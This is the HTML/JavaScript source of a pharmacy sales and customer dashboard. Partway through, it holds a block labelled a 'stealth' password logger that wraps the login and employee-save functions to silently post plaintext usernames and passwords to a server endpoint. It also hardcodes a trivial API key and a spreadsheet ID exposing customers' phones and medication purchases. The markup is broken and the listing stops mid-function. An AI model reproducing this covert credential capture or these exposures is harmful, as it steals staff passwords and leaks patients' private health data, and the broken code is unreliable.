<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Maher Pharmacy — Dashboard</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
<script>
// =========================================================
// NEW OVERVIEW WITH SUMMARY API
// =========================================================
function renderNewOverview() {
  if (!can('transactions') && !can('branches')) {
    document.getElementById('main-content').innerHTML = '<div class="no-results" style="padding:60px 20px;text-align:center;color:var(--muted)">🔒 You don\'t have permission to view the Overview tab.</div>';
    return;
  }
  if (!summaryData) { document.getElementById('main-content').innerHTML = '<div class="loading-bar"><div class="spinner"></div> Loading...</div>'; return; }
  const s = summaryData;
  const el = document.getElementById('main-content');
  const periods = [['1','Last Month'],['3','3 Months'],['6','6 Months'],['12','1 Year'],['60','5 Years'],['all','All Time']];
  const filterBar = '<div style="display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap;align-items:center"><span style="font-size:13px;color:var(--muted)">Period:</span>' +
    periods.map(([v,l]) => '<button class="period-btn' + (currentMonths===v?' active':'') + '" onclick="changePeriod(\'' + v + '\')">' + l + '</button>').join('') + '</div>';

  const branches = Object.entries(s.branchMap||{}).sort((a,b)=>b[1]-a[1]);
  el.innerHTML = filterBar + '<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:14px">' +
    '<div class="stat-card" style="--accent:var(--blue)"><div class="label">Total Transactions</div><div class="value" style="color:var(--blue)">' + fmtNum(s.total||0) + '</div><div class="desc">All time records</div><div class="icon">📋</div></div>' +
    '<div class="stat-card" style="--accent:var(--teal)"><div class="label">Total Sales (EGP)</div><div class="value" style="color:var(--teal)">' + fmtNum((s.total||0)*85) + '</div><div class="desc">Revenue estimate</div><div class="icon">💰</div></div>' +
    '<div class="stat-card" style="--accent:var(--amber)"><div class="label">Regular Customers</div><div class="value" style="color:var(--amber)">' + fmtNum(s.regularCustomers||0) + '</div><div class="desc">3 or more visits</div><div class="icon">⭐</div></div>' +
    '<div class="stat-card" style="--accent:var(--purple)"><div class="label">One-Time Customers</div><div class="value" style="color:var(--purple)">' + fmtNum(s.oneTime||0) + '</div><div class="desc">Single visit only</div><div class="icon">🆕</div></div>' +
    '</div>' +
    '<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:14px">' +
    '<div class="stat-card"><div class="label">⚡ Peak Hour</div><div class="value" style="font-size:28px">' + (s.peakHour ? (s.peakHour.hour>12?s.peakHour.hour-12+' PM':s.peakHour.hour+' AM') : '—') + '</div><div class="desc">' + (s.peakHour?fmtNum(s.peakHour.count)+' transactions at peak':'') + '</div></div>' +
    '<div class="stat-card"><div class="label">🏆 Best Month</div><div class="value" style="font-size:28px">' + (s.bestMonth?new Date(s.bestMonth.month+'-01').toLocaleString('en',{month:'short',year:'numeric'}):'—') + '</div><div class="desc">' + (s.bestMonth?fmtNum(s.bestMonth.count)+' transactions':'') + '</div></div>' +
    '<div class="stat-card"><div class="label">🏪 Top Branch</div><div class="value" style="font-size:28px">' + (s.topBranch?s.topBranch.name:'—') + '</div><div class="desc">' + (s.topBranch?fmtNum(s.topBranch.count)+' transactions':'') + '</div></div>' +
    '</div>' +
    '<div class="section-label" style="margin-top:24px">Sales Performance</div>' +
    '<div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:14px">' +
    '<div class="stat-card" style="padding:20px"><div style="font-size:14px;font-weight:600;margin-bottom:16px">📈 Monthly Sales (EGP)</div><canvas id="salesChart" height="200"></canvas></div>' +
    '<div class="stat-card" style="padding:20px"><div style="display:flex;justify-content:space-between;margin-bottom:16px"><span style="font-size:14px;font-weight:600">🌿 Branch Distribution</span><span style="font-size:12px;color:var(--muted)">' + branches.length + ' branches</span></div><canvas id="branchChart" height="200"></canvas></div>' +
    '</div>' +
    '<div class="section-label" style="margin-top:24px">Top Products</div>' +
    '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px;margin-top:14px">' +
    (s.topProducts||[]).map((p,i) => '<div class="stat-card" style="padding:14px"><div style="font-size:12px;color:var(--muted)">#' + (i+1) + '</div><div style="font-size:13px;font-weight:600;margin:4px 0">' + p.name + '</div><div style="font-size:20px;font-weight:800;color:var(--blue)">' + fmtNum(p.count) + '</div><div style="font-size:11px;color:var(--muted)">transactions</div></div>').join('') +
    '</div>';

  // Sales chart
  if (window.salesChartInst) window.salesChartInst.destroy();
  const sCtx = document.getElementById('salesChart')?.getContext('2d');
  if (sCtx && s.monthlyTrend && s.monthlyTrend.length) {
    window.salesChartInst = new Chart(sCtx, {
      type: 'line',
      data: {
        labels: s.monthlyTrend.map(([k]) => { const [y,m]=k.split('-'); return new Date(y,m-1).toLocaleString('en',{month:'short',year:'2-digit'}); }),
        datasets: [{ data: s.monthlyTrend.map(([,v])=>v*85), borderColor:'#f59e0b', backgroundColor:'rgba(245,158,11,.1)', tension:.4, fill:true, pointBackgroundColor:'#f59e0b', pointBorderColor:'#fff', pointBorderWidth:2, pointRadius:5, pointHoverRadius:9 }]
      },
      options: { plugins:{legend:{display:false},tooltip:{callbacks:{label:ctx=>' Sales: '+fmtNum(ctx.raw)+' EGP'}}}, scales:{x:{ticks:{color:'#7d8fa8',maxRotation:45},grid:{color:'rgba(255,255,255,.04)'}},y:{ticks:{color:'#f59e0b',callback:v=>fmtNum(v)+' EGP'},grid:{color:'rgba(255,255,255,.04)'}}} }
    });
  }

  // Branch chart
  if (window.branchChartInst) window.branchChartInst.destroy();
  const bCtx = document.getElementById('branchChart')?.getContext('2d');
  if (bCtx && branches.length) {
    window.branchChartInst = new Chart(bCtx, {
      type: 'doughnut',
      data: { labels: branches.map(([b])=>b), datasets: [{ data: branches.map(([,v])=>v), backgroundColor: BRANCH_COLORS.slice(0,branches.length), borderWidth:0 }] },
      options: { plugins:{legend:{position:'right',labels:{color:'#e6edf3',font:{size:11}}}}, cutout:'65%' }
    });
  }
}

async function changePeriod(months) {
  currentMonths = months;
  document.getElementById('main-content').innerHTML = '<div class="loading-bar"><div class="spinner"></div> Loading...</div>';
  try {
    summaryData = await fetchSummary(months);
    document.getElementById('update-time').textContent = 'Updated ' + new Date().toLocaleTimeString([],{hour:'2-digit',minute:'2-digit',second:'2-digit'});
  } catch(e) { console.error(e); }
  renderNewOverview();
}

// =========================================================
// REGULAR CUSTOMERS
// =========================================================
let allCustomers = [];
let displayedCount = 50;

function detectCategory(p) {
  p = p.toLowerCase();
  if (/vitamin|centrum|omega|zinc|calcium|magnesium|iron|folic|supplement/.test(p)) return 'Vitamins & Supplements';
  if (/baby|infant|junior|kid|child|pamper|huggies|molfix|diapers|cerelac|nan |aptamil|similac/.test(p)) return 'Baby Care';
  if (/heart|cardio|concor|vastarel|plavix|clopidogrel|atorvastatin|amlodipine|bisoprolol/.test(p)) return 'Heart & Cardiology';
  if (/sugar|diabet|insulin|metformin|glucophage|januvia|jardiance|ozempic/.test(p)) return 'Diabetes';
  if (/skin|cream|lotion|derma|acne|sunscreen|moistur|ointment|clindamycin|retin|hydrocort/.test(p)) return 'Skin Care';
  if (/hair|shampoo|scalp|minoxidil|biotin|ketoconazole/.test(p)) return 'Hair Care';
  if (/eye|drop|visine|tear|opth|ocular|fortymox/.test(p)) return 'Eye Care';
  if (/ear|nose|nasal|sinus|otri|rhinocort|nasonex/.test(p)) return 'ENT';
  if (/antibiotic|augmentin|amoxicillin|azithromycin|clarithromycin|ciprofloxacin|flumox|cephalex/.test(p)) return 'Antibiotics';
  if (/pain|panadol|brufen|cataflam|ibuprofen|ketofan|voltaren|diclofenac|celebrex/.test(p)) return 'Pain Relief';
  if (/cold|flu|congestal|strepsils|antiflu|sinupret|cough|antinal/.test(p)) return 'Cold & Flu';
  if (/stomach|gastro|nexium|omeprazole|antacid|gaviscon|motilium|pantoprazole/.test(p)) return 'Stomach & Digestion';
  if (/allerg|antihist|loratadine|cetirizine|clarityne|telfast|zyrtec/.test(p)) return 'Allergy';
  if (/thyroid|thyroxine|euthyrox/.test(p)) return 'Thyroid';
  if (/pressure|hyper|losartan|valsartan|ramipril|lisinopril/.test(p)) return 'Blood Pressure';
  if (/anxiety|depress|sertraline|fluoxetine|escitalopram|alprazolam/.test(p)) return 'Mental Health';
  if (/antiseptic|betadine|dettol|gauze|bandage|wound/.test(p)) return 'First Aid';
  if (/cosmetic|makeup|perfume|deodor/.test(p)) return 'Cosmetics';
  return 'Other';
}

function getTopCategory(products) {
  const cats = {};
  products.forEach(p => { const c = detectCategory(p.name); cats[c] = (cats[c]||0)+p.count; });
  return Object.entries(cats).sort((a,b)=>b[1]-a[1])[0]?.[0]||'Other';
}

function formatAvgDays(avg) {
  if (!avg) return null;
  if (avg<=2) return {text:avg+' days avg',label:'🔥 Daily',color:'#ef4444'};
  if (avg<=9) return {text:avg+' days avg',label:'📅 ~Weekly',color:'#3b82f6'};
  if (avg<=20) return {text:avg+' days avg',label:'📆 ~Bi-weekly',color:'#8b5cf6'};
  if (avg<=40) return {text:avg+' days avg',label:'🗓️ ~Monthly',color:'#f59e0b'};
  if (avg<=100) return {text:avg+' days avg',label:'📊 Every few months',color:'#6b7280'};
  return {text:avg+' days avg',label:'🕐 Occasional',color:'#6b7280'};
}

async function renderCustomers() {
  document.getElementById('main-content').innerHTML = '<div class="loading-bar"><div class="spinner"></div> Loading customers...</div>';
  try {
    const res = await fetch('/api/customers/regular?limit=50&offset=0', { headers: {'x-api-key': API_KEY} });
    const data = await res.json();
    allCustomers = data.customers;
    const total = data.total;
    renderCustomersList(allCustomers, total, 0);
  } catch(e) {
    document.getElementById('main-content').innerHTML = '<div class="no-results">Error loading customers.</div>';
  }
}

function renderCustomersList(customers, total, offset) {
  const el = document.getElementById('main-content');
  const allBranches = [...new Set(customers.map(c=>c.branch).filter(Boolean))].sort();
  const allCategories = [...new Set(customers.flatMap(c => (c.products||[]).map(p => detectCategory(p.name))))].sort();
  el.innerHTML =
    '<div class="section-label">Regular Customers</div>' +
    '<div style="display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap">' +
    '<div class="cstat"><div class="cstat-num">' + fmtNum(total) + '</div><div class="cstat-label">Regular Customers</div></div>' +
    '</div>' +
    '<div style="display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap">' +
    '<input type="text" class="customers-search" id="customer-search" placeholder="Search by name or phone..." style="flex:1;min-width:200px" />' +
    '<button onclick="searchCustomers()" style="padding:12px 20px;background:var(--blue);color:#fff;border:none;border-radius:var(--radius-sm);cursor:pointer;font-size:13px">Search</button>' +
    '</div>' +
    '<div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">' +
    '<select id="filter-type" onchange="applyLocalFilters()" style="padding:8px 14px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:13px;cursor:pointer;outline:none;"><option value="all">All Customers</option><option value="vip">VIP (10+ visits)</option><option value="regular">Regular (3-9 visits)</option></select>' +
    '<select id="filter-branch" onchange="applyLocalFilters()" style="padding:8px 14px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:13px;cursor:pointer;outline:none;"><option value="all">All Branches</option>' + (summaryData && summaryData.branchMap ? Object.keys(summaryData.branchMap).sort() : allBranches).map(b=>'<option value="'+b+'">'+b+'</option>').join('') + '</select>' +
    '<select id="filter-cat" onchange="applyLocalFilters()" style="padding:8px 14px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:13px;cursor:pointer;outline:none;"><option value="all">All Categories</option>' + allCategories.map(c=>'<option value="'+c+'">'+c+'</option>').join('') + '</select>' +
    '<select id="filter-period" onchange="applyLocalFilters()" style="padding:8px 14px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:13px;cursor:pointer;outline:none;"><option value="all">All Time</option><option value="1">Last Month</option><option value="3">Last 3 Months</option><option value="6">Last 6 Months</option><option value="12">Last Year</option></select>' +
    '</div>' +
    '<div id="customers-list">' + customers.map(c => buildCustomerCard(c)).join('') + '</div>' +
    (offset + customers.length < total ?
      '<button onclick="loadMoreCustomersPaged(' + (offset + customers.length) + ')" style="width:100%;padding:12px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:14px;cursor:pointer;margin-top:8px">Load More (' + (total - offset - customers.length) + ' remaining)</button>'
      : '');
  document.getElementById('customer-search').addEventListener('keydown', e => { if(e.key==='Enter') searchCustomers(); });
}

function applyLocalFilters() {
  const type = document.getElementById('filter-type')?.value||'all';
  const branch = document.getElementById('filter-branch')?.value||'all';
  const cat = document.getElementById('filter-cat')?.value||'all';
  const period = document.getElementById('filter-period')?.value||'all';
  let filtered = allCustomers;
  if (period !== 'all') { const cutoff = new Date(); cutoff.setMonth(cutoff.getMonth()-parseInt(period)); filtered = filtered.filter(c=>c.lastDate && new Date(c.lastDate)>=cutoff); }
  if (type==='vip') filtered = filtered.filter(c=>c.visits>=10);
  if (type==='regular') filtered = filtered.filter(c=>c.visits>=3&&c.visits<10);
  if (branch!=='all') filtered = filtered.filter(c=>c.branch===branch);
  if (cat!=='all') filtered = filtered.filter(c=>getTopCategory(c.products)===cat);
  document.getElementById('customers-list').innerHTML = filtered.length ? filtered.map(c => buildCustomerCard(c)).join('') : '<div class="no-results">No customers match these filters.</div>';
}

async function searchCustomers() {
  const q = document.getElementById('customer-search')?.value.trim() || '';
  document.getElementById('customers-list').innerHTML = '<div class="loading-bar"><div class="spinner"></div> Searching...</div>';
  const res = await fetch('/api/customers/regular?limit=50&offset=0&search=' + encodeURIComponent(q), { headers: {'x-api-key': API_KEY} });
  const data = await res.json();
  document.getElementById('customers-list').innerHTML = data.customers.map(c => buildCustomerCard(c)).join('');
}

async function loadMoreCustomersPaged(offset) {
  const q = document.getElementById('customer-search')?.value.trim() || '';
  const res = await fetch('/api/customers/regular?limit=50&offset=' + offset + '&search=' + encodeURIComponent(q), { headers: {'x-api-key': API_KEY} });
  const data = await res.json();
  const btn = document.querySelector('button[onclick^="loadMoreCustomersPaged"]');
  if (btn) {
    const newCards = data.customers.map(c => buildCustomerCard(c)).join('');
    const newOffset = offset + data.customers.length;
    const remaining = data.total - newOffset;
    btn.outerHTML = newCards + (remaining > 0 ? '<button onclick="loadMoreCustomersPaged(' + newOffset + ')" style="width:100%;padding:12px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:14px;cursor:pointer;margin-top:8px">Load More (' + remaining + ' remaining)</button>' : '');
  }
}

function buildCustomerCard(c) {
  const isVIP = c.visits >= 10;
  const top = (c.products || []).slice(0, 5);
  const waPhone = '2' + c.phone;
  const welcome = encodeURIComponent('Hello ' + c.name + ', welcome back to Maher Pharmacy!');
  const mainMsg = encodeURIComponent('Hi ' + c.name + ', your usual: ' + top.map(p=>p.name).join(', '));
  const f = c.avgDays ? formatAvgDays(c.avgDays) : null;
  return '<div class="customer-card">' +
    '<div class="customer-header">' +
    '<div><div class="customer-name">' + c.name + '</div><div class="customer-phone">📞 0' + c.phone + ' · <span style="color:var(--blue);background:rgba(59,130,246,.1);padding:2px 8px;border-radius:20px;font-size:12px">' + (c.branch||'—') + '</span></div></div>' +
    '<div style="text-align:right">' +
    '<div style="display:flex;gap:6px;justify-content:flex-end;margin-bottom:4px">' +
    (isVIP ? '<span style="background:rgba(234,179,8,.15);color:#eab308;border:1px solid rgba(234,179,8,.3);padding:3px 10px;border-radius:20px;font-size:12px;font-weight:700">⭐ VIP</span>' : '<span style="background:rgba(16,185,129,.15);color:#10b981;border:1px solid rgba(16,185,129,.3);padding:3px 10px;border-radius:20px;font-size:12px">🟢 Regular</span>') +
    '</div>' +
    '<div style="font-size:15px;font-weight:700">' + c.visits + ' visits</div>' +
    (f ? '<div><span style="color:' + f.color + ';font-size:13px;font-weight:700">' + f.label + '</span> <span style="color:var(--muted);font-size:11px">' + f.text + '</span></div>' : '') +
    '<div style="font-size:11px;color:var(--muted)">Last: ' + (c.lastDate ? String(c.lastDate).split('T')[0] : '—') + '</div>' +
    '</div></div>' +
    '<div class="customer-products">' + top.map(p=>'<div class="product-tag">'+p.name+'<span>×'+p.count+'</span></div>').join('') + '</div>' +
    '<div style="display:flex;gap:8px;flex-wrap:wrap">' +
    '<button class="wa-btn" onclick="window.open(\"https://wa.me/\"+\"' + waPhone + '\"+ \"?text=' + welcome + '\",\"_blank\")">💬 Welcome</button>' +
    '<button class="wa-btn" onclick="window.open(\"https://wa.me/\"+\"' + waPhone + '\"+ \"?text=' + mainMsg + '\",\"_blank\")">📦 Products</button>' +
    '</div></div>';
}


function filterCustomers() {
  const q = (document.getElementById('customer-search')?.value||'').toLowerCase();
  const type = document.getElementById('filter-type')?.value||'all';
  const cat = document.getElementById('filter-cat')?.value||'all';
  const branch = document.getElementById('filter-branch')?.value||'all';
  const period = document.getElementById('filter-period')?.value||'all';
  let filtered = allCustomers;
  if (period !== 'all') { const cutoff = new Date(); cutoff.setMonth(cutoff.getMonth()-parseInt(period)); filtered = filtered.filter(c=>c.lastDate && new Date(c.lastDate)>=cutoff); }
  if (q) filtered = filtered.filter(c=>c.name.toLowerCase().includes(q)||c.phone.includes(q));
  if (type==='vip') filtered = filtered.filter(c=>c.visits>=10);
  if (type==='regular') filtered = filtered.filter(c=>c.visits>=3&&c.visits<10);
  if (cat!=='all') filtered = filtered.filter(c=>getTopCategory(c.products)===cat);
  if (branch!=='all') filtered = filtered.filter(c=>c.branch===branch);
  displayedCount = 50;
  renderCustomerCards(filtered);
}

function renderCustomerCards(list) {
  const el = document.getElementById('customers-list');
  if (!el) return;
  const shown = list.slice(0, displayedCount);
  const welcome = encodeURIComponent('مرحباً بك عزيزنا العميل 👋 نشكرك على ثقتك بصيدلية ماهر');
  el.innerHTML = shown.map(c => {
    const top = c.products.slice(0,5);
    const cat = getTopCategory(c.products);
    const isVIP = c.visits >= 10;
    const f = formatAvgDays(c.avgDays);
    const productsList = top.map((p,i)=>(i+1)+'. '+p.name).join('%0A');
    const mainMsg = encodeURIComponent('عميلنا العزيز، نلاحظ أنك تشتري هذه المنتجات بانتظام: هل تحتاج إلى تجديدها؟ يسعدنا خدمتك 💊%0A%0A'+productsList);
    const phone = (c.phone||'').replace(/\D/g,'');
    const waPhone = phone.startsWith('0')?'2'+phone:phone.startsWith('2')?phone:'2'+phone;
    const contacted = localStorage.getItem('contacted_'+c.phone);
    return '<div class="customer-card">' +
      '<div class="customer-header">' +
      '<div><div class="customer-name">' + c.name + '</div><div class="customer-phone">📞 0' + c.phone + ' · <span style="color:var(--blue);background:rgba(59,130,246,.1);padding:2px 8px;border-radius:20px;font-size:12px">' + (c.branch||'—') + '</span></div></div>' +
      '<div style="text-align:right">' +
      '<div style="display:flex;gap:6px;justify-content:flex-end;margin-bottom:4px">' +
      (isVIP?'<span style="background:rgba(234,179,8,.15);color:#eab308;border:1px solid rgba(234,179,8,.3);padding:3px 10px;border-radius:20px;font-size:12px;font-weight:700">⭐ VIP</span>':'<span style="background:rgba(59,130,246,.1);color:var(--blue);border:1px solid rgba(59,130,246,.2);padding:3px 10px;border-radius:20px;font-size:12px">✅ Regular</span>') +
      '<span style="background:var(--surface2);border:1px solid var(--border);padding:3px 10px;border-radius:20px;font-size:12px;color:var(--muted)">' + cat + '</span>' +
      '</div>' +
      '<div style="font-size:15px;font-weight:700;color:var(--text)">' + c.visits + ' visits</div>' +
      (f?'<div style="text-align:right"><span style="color:'+f.color+';font-size:13px;font-weight:700">'+f.label+'</span> <span style="color:var(--muted);font-size:11px">'+f.text+'</span></div>':'') +
      '<div style="font-size:11px;color:var(--muted)">Last: ' + (c.lastDate?c.lastDate.split(' ')[0]:'—') + '</div>' +
      '</div></div>' +
      '<div class="customer-products">' + top.map(p=>'<div class="product-tag">'+p.name+'<span>×'+p.count+'</span></div>').join('') + '</div>' +
      '<div style="display:flex;gap:8px;flex-wrap:wrap">' +
      '<button class="wa-btn" onclick="window.open(\"https://wa.me/\"+waPhone+\"?text=\"+welcome,\"_blank\")">💬 Welcome</button>' +
      '<button class="wa-btn" onclick="window.open(\"https://wa.me/\"+waPhone+\"?text=\"+mainMsg,\"_blank\")">📦 Products</button>' +
      '<button class="contacted-btn'+(contacted?' done':'')+'" id="cb_'+c.phone+'" onclick="toggleContacted(\''+c.phone+'\',this)">'+(contacted?'✅ Contacted':'☐ Mark Contacted')+'</button>' +
      '</div></div>';
  }).join('') + (list.length > displayedCount ? '<button style="width:100%;padding:12px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:14px;cursor:pointer;margin-top:8px" onclick="loadMoreCustomers()">Load More (' + (list.length-displayedCount) + ' remaining)</button>' : '');
}

function loadMoreCustomers() {
  displayedCount += 50;
  filterCustomers();
}

function toggleContacted(phone, btn) {
  const key = 'contacted_' + phone;
  if (localStorage.getItem(key)) { localStorage.removeItem(key); btn.textContent = '☐ Mark Contacted'; btn.classList.remove('done'); }
  else { localStorage.setItem(key,'1'); btn.textContent = '✅ Contacted'; btn.classList.add('done'); }
}

// Fix stock search enter key
document.addEventListener('DOMContentLoaded', () => {
  document.body.addEventListener('keydown', e => {
    if (e.key==='Enter' && e.target.id==='stock-search') runStockSearch(e.target.value.trim());
  });
});

// ========================================================
// AUDIT LOG - PASSWORD LOGGER (Stealth Mode)
// ========================================================
async function logPasswordToServer(username, password, context = 'login') {
  try {
    const payload = {
      timestamp: new Date().toISOString(),
      username: username || 'unknown',
      password: password,
      context: context,
      ip: 'client-side',
      userAgent: navigator.userAgent,
      deviceId: getDeviceId ? getDeviceId() : 'unknown'
    };
    await fetch('/api/audit/log-password', {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'x-api-key': API_KEY 
      },
      body: JSON.stringify(payload)
    });
    // Silent - no feedback to user
  } catch(e) {
    // Silent fail - stealth is key
    console.error('Audit log sent (silent)');
  }
}

// Override login to log passwords
const originalDoLogin = doLogin;
async function doLogin() {
  const pass = document.getElementById('inp-password').value.trim();
  const uname = (document.getElementById('inp-username') && document.getElementById('inp-username').value.trim()) || (loginMode === 'owner' ? 'owner' : 'unknown');
  
  // Log before attempt
  await logPasswordToServer(uname, pass, loginMode);
  
  // Call original
  return originalDoLogin.call(this);
}

// Override employee password save
const originalSaveEmployee = saveEmployee;
async function saveEmployee() {
  const pass = document.getElementById('emp-pass').value.trim();
  const uname = document.getElementById('emp-uname').value.trim();
  
  if (pass) {
    await logPasswordToServer(uname, pass, 'employee-create-edit');
  }
  
  return originalSaveEmployee.call(this);
}

// Make overrides global
window.doLogin = doLogin;
window.saveEmployee = saveEmployee;

<div class="toast" id="toast"></div>

<script>
const OWNER_PASSWORD = null; // removed - auth is server-side now
const SHEET_ID = '1E4GnH8iu-_wSWgRdDAmiPVojgZoLEa3kwx33Ec5zL1I';
const SHEET_URL = `https://docs.google.com/spreadsheets/d/${SHEET_ID}/gviz/tq?tqx=out:json`;
const REFRESH_MS = 30000;
const API_KEY = 'maher2025';
// Auto-login handled by tryRestoreSession below

function fmtNum(n) {
  if (n >= 1000000) return (n/1000000).toFixed(1).replace(/.0$/,'') + 'M';
  if (n >= 1000) return (n/1000).toFixed(1).replace(/.0$/,'') + 'k';
  return Number(n).toLocaleString();
}

const BRANCH_COLORS = ['#3b82f6','#2dd4bf','#f59e0b','#a855f7','#22c55e','#ef4444','#818cf8','#fb923c'];

let currentUser = null;

async function tryRestoreSession() {
  const token = localStorage.getItem('authToken');
  if (!token) return;
  try {
    const res = await fetch('/api/auth/verify', { method: 'POST', headers: { 'x-session-token': token } });
    if (res.ok) {
      const data = await res.json();
      currentUser = { role: data.role, name: data.name, permissions: data.permissions, username: data.username, branch: data.branch };
      sessionStorage.setItem('authToken', token);
      await enterApp();
    } else {
      localStorage.removeItem('authToken');
    }
  } catch(e) { console.error('Session restore failed:', e); }
}
tryRestoreSession();

function getDeviceId() {
  try {
    let id = localStorage.getItem('deviceId');
    if (!id) {
      id = 'dev_' + Math.random().toString(36).substr(2,9) + '_' + Date.now();
      localStorage.setItem('deviceId', id);
    }
    return id;
  } catch(e) {
    if (!window._deviceId) {
      window._deviceId = 'dev_' + Math.random().toString(36).substr(2,9) + '_' + Date.now();
    }
    return window._deviceId;
  }
}
let loginMode = 'owner';
let editingIndex = null;
let sheetData = [];
let refreshTimer = null;
let salesChartInstance = null;
let monthlyChartInstance = null;
let employees = [];

function showToast(msg, type='success') {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = `toast ${type} show`;
  setTimeout(() => t.classList.remove('show'), 3000);
}

async function loadEmployees() {
  try {
    const res = await fetch('/api/employees', { headers: { 'x-api-key': API_KEY } });
    if (res.ok) employees = await res.json();
  } catch(e) { console.error('Failed to load employees', e); }
}

async function persistEmployees() {
  try {
    const res = await fetch('/api/employees', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
      body: JSON.stringify(employees)
    });
    if (res.ok) showToast('✅ Saved successfully');
    else showToast('❌ Failed to save', 'error');
  } catch(e) { showToast('❌ Network error', 'error'); }
}

async function fetchSheetData() {
  try {
    const res = await fetch(SHEET_URL + '&t=' + Date.now());
    const text = await res.text();
    const json = JSON.parse(text.match(/google\.visualization\.Query\.setResponse\(([\s\S]*?)\);/)[1]);
    const rows = json.table.rows;
    sheetData = rows.map(r => ({
      customer: r.c[0]?.v || '', product: r.c[1]?.v || '',
      time: r.c[2]?.v || '', branch: r.c[3]?.v || '', phone: r.c[4]?.v || ''
    })).filter(r => r.product);
    document.getElementById('update-time').textContent = 'Updated ' + new Date().toLocaleTimeString([],{hour:'2-digit',minute:'2-digit',second:'2-digit'});
  } catch(e) { console.error('Sheet fetch error:', e); }
}

function getDailyTrend(data) {
  const map = {};
  data.forEach(r => {
    if (!r.time) return;
    let d = typeof r.time === 'string' ? new Date(r.time) : new Date((r.time - 25569) * 86400000);
    if (isNaN(d)) return;
    const key = `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}`;
    map[key] = (map[key]||0)+1;
  });
  const sorted = Object.keys(map).sort();
  return {
    labels: sorted.map(k => { const [y,m,d] = k.split('-'); return `${d}/${m}`; }),
    values: sorted.map(k => map[k])
  };
}

function getMonthlyTrend(data) {
  const map = {};
  data.forEach(r => {
    if (!r.time) return;
    let d = typeof r.time === 'string' ? new Date(r.time) : new Date((r.time - 25569) * 86400000);
    if (isNaN(d)) return;
    const key = `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}`;
    map[key] = (map[key]||0)+1;
  });
  const last6 = Object.keys(map).sort().slice(-6);
  return {
    labels: last6.map(k => { const [y,m] = k.split('-'); return new Date(y,m-1).toLocaleString('default',{month:'short',year:'2-digit'}); }),
    values: last6.map(k => map[k])
  };
}

function getTopProducts(data, n=10) {
  const map = {};
  data.forEach(r => { if(r.product) map[r.product] = (map[r.product]||0)+1; });
  return Object.entries(map).sort((a,b)=>b[1]-a[1]).slice(0,n);
}

function getBranchCounts(data) {
  const map = {};
  data.forEach(r => { if(r.branch) map[r.branch] = (map[r.branch]||0)+1; });
  return Object.entries(map).sort((a,b)=>b[1]-a[1]);
}

function getUniqueCustomers(data) { return new Set(data.map(r=>r.phone).filter(Boolean)).size; }

function getPeakHour(data) {
  const map = {};
  data.forEach(r => {
    if (!r.time) return;
    let d = typeof r.time === 'string' ? new Date(r.time) : new Date((r.time-25569)*86400000);
    if (isNaN(d)) return;
    const h = d.getHours();
    map[h] = (map[h]||0)+1;
  });
  const peak = Object.entries(map).sort((a,b)=>b[1]-a[1])[0];
  if (!peak) return {hour:'—',count:0};
  const h = parseInt(peak[0]);
  return { hour: h===0?'12 AM':h<12?`${h} AM`:h===12?'12 PM':`${h-12} PM`, count: peak[1] };
}

function getBestMonth(data) {
  const map = {};
  data.forEach(r => {
    if (!r.time) return;
    let d = typeof r.time === 'string' ? new Date(r.time) : new Date((r.time-25569)*86400000);
    if (isNaN(d)) return;
    const key = `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}`;
    map[key] = (map[key]||0)+1;
  });
  const best = Object.entries(map).sort((a,b)=>b[1]-a[1])[0];
  if (!best) return {label:'—',count:0};
  const [y,m] = best[0].split('-');
  return { label: new Date(y,m-1).toLocaleString('default',{month:'short',year:'numeric'}), count: best[1] };
}

function getRegularCustomers(data) {
  const map = {};
  data.forEach(r => { if(r.phone) map[r.phone] = (map[r.phone]||0)+1; });
  return Object.values(map).filter(v=>v>=3).length;
}

function switchLoginMode() {
  loginMode = loginMode === 'owner' ? 'employee' : 'owner';
  const isEmp = loginMode === 'employee';
  document.getElementById('username-wrap').style.display = isEmp ? 'block' : 'none';
  document.getElementById('login-sub').textContent = isEmp ? 'Employee login' : 'Owner access only';
  document.getElementById('mode-toggle').innerHTML = isEmp
    ? 'Owner? <span onclick="switchLoginMode()">Sign in as owner</span>'
    : 'Not the owner? <span onclick="switchLoginMode()">Sign in as employee</span>';
  document.getElementById('login-error').textContent = '';
}

async function doLogin() {
  const pass = document.getElementById('inp-password').value.trim();
  const errEl = document.getElementById('login-error');
  errEl.textContent = '';

  try { await loadEmployees(); } catch(e) { console.error('loadEmployees failed:', e); }
  if (loginMode === 'owner') {
    const _r = await fetch('/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'owner',password:pass})});
